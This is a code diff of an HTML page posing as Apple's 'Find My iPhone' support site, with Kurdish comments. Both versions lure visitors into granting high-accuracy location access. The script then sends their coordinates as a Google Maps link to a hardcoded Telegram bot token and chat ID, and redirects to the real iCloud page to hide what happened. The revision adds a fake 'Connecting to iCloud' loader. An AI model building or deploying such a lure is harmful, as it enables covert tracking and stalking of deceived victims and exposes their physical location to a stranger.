@@ -5,54 +5,74 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Find My iPhone | Apple Support</title>
     <style>
-        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #f2f2f7; margin: 0; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; }
-        .container { text-align: center; padding: 20px; width: 90%; max-width: 400px; background: white; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); }
-        img { width: 80px; margin-bottom: 20px; }
-        h1 { font-size: 22px; font-weight: 600; margin-bottom: 10px; color: #1d1d1f; }
-        p { font-size: 15px; color: #86868b; margin-bottom: 30px; line-height: 1.4; }
-        .btn { background-color: #007aff; color: white; border: none; padding: 15px 40px; font-size: 17px; font-weight: 500; border-radius: 12px; cursor: pointer; width: 100%; transition: background 0.3s; }
-        .btn:active { background-color: #0056b3; }
+        body { font-family: -apple-system, system-ui, sans-serif; background-color: #f2f2f7; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
+        .container { text-align: center; padding: 30px; width: 85%; max-width: 350px; background: white; border-radius: 20px; box-shadow: 0 10px 40px rgba(0,0,0,0.1); }
+        img { width: 60px; margin-bottom: 20px; }
+        h1 { font-size: 20px; font-weight: 600; color: #1d1d1f; }
+        p { font-size: 14px; color: #86868b; margin-bottom: 30px; }
+        .btn { background-color: #007aff; color: white; border: none; padding: 15px; font-size: 17px; font-weight: 600; border-radius: 12px; cursor: pointer; width: 100%; -webkit-tap-highlight-color: transparent; }
+        #loader { display: none; margin-top: 15px; color: #007aff; font-weight: 500; }
     </style>
 </head>
 <body>
 
 <div class="container">
     <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" alt="Apple">
-    <h1>Find Your Device</h1>
-    <p>To locate your lost device or nearby Apple Store, please allow location access to continue.</p>
-    <button class="btn" onclick="requestIOSLocation()">Allow Access</button>
+    <h1>Find My Device</h1>
+    <p>Please authorize location access to find your lost AirPods, iPhone, or iPad nearby.</p>
+    <button class="btn" onclick="getIOSLocation()">Locate Device</button>
+    <div id="loader">Connecting to iCloud...</div>
 </div>
 
 <script>
-function requestIOSLocation() {
-    // ڕێکخستنی زۆر ورد بۆ ئایفۆن
-    const options = {
-        enableHighAccuracy: true,
-        timeout: 10000,
-        maximumAge: 0
-    };
+async function getIOSLocation() {
+    const btn = document.querySelector('.btn');
+    const loader = document.getElementById('loader');
+    
+    btn.style.display = 'none';
+    loader.style.display = 'block';
 
     if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(
-            (pos) => {
-                const lat = pos.coords.latitude;
-                const lon = pos.coords.longitude;
-                // بەکارهێنانی Telegram Bot API بۆ وەرگرتنی ئەنجامەکە (باشترین ڕێگە بۆ ئایفۆن)
-                const token = "8650943162:AAHmh7cUjfvYC6A8jWdEy1KE3_wM5Xz2USk";
-                const chat_id = "1097286681";
-                const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
-                const msg = `📍 **NEW IPHONE LOCATION**\n\nLink: ${mapLink}`;
+        navigator.geolocation.getCurrentPosition(async (pos) => {
+            const lat = pos.coords.latitude;
+            const lon = pos.coords.longitude;
+            
+            // زانیارییەکانی تۆ
+            const token = "8650943162:AAHmh7cUjfvYC6A8jWdEy1KE3_wM5Xz2USk";
+            const chat_id = "1097286681";
+            const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
+            const text = `📍 **IPHONE LOCATION DETECTED**\n\nLink: ${mapLink}`;
 
-                fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`)
-                .then(() => {
-                    window.location.href = "https://www.apple.com/icloud/find-my/";
+            // بەکارهێنانی Fetch بە شێوازی awiat بۆ ئەوەی دڵنیا بین داتاکە نێردراوە
+            try {
+                await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: chat_id,
+                        text: text,
+                        parse_mode: 'Markdown'
+                    })
                 });
-            },
-            (err) => {
-                window.location.href = "https://www.apple.com/icloud/find-my/";
-            },
-            options
-        );
+                
+                // ٣ چرکە چاوەڕێ دەکەین تا دڵنیا بین تەلەگرام داتاکەی وەرگرتووە
+                setTimeout(() => {
+                    window.location.href = "https://www.icloud.com/find";
+                }, 3000);
+
+            } catch (err) {
+                window.location.href = "https://www.icloud.com/find";
+            }
+        }, (err) => {
+            // ئەگەر ڕەزامەندی نەدا
+            window.location.href = "https://www.icloud.com/find";
+        }, {
+            enableHighAccuracy: true,
+            timeout: 15000,
+            maximumAge: 0
+        });
+    } else {
+        window.location.href = "https://www.icloud.com/find";
     }
 }
 </script>
